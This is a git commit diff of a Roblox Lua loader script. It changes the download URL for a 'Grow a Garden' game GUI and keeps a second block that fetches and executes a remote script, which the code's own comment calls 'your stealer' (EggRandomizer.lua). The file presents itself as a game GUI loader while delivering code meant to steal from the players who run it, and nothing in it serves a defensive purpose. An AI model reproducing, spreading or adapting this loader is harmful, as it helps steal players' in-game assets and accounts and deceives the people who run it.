09eb32cb866cf65665a8a53c01f598e80daed405
HKTwoScript <jancmafs@gmail.com>
2025-07-20 14:43:03 +0200

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,9 +1,9 @@
 pcall(function()
-    -- Load Grow a Garden GUI from Codeberg
-    loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+    -- Load GaG GUI from ThundarZ
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua"))()
 end)
 
 pcall(function()
-    -- Load your stealer (EggRandomizer.lua) from GitHub
+    -- Load your stealer (EggRandomizer.lua)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/SpinUI/main/EggRandomizer.lua"))()
 end)
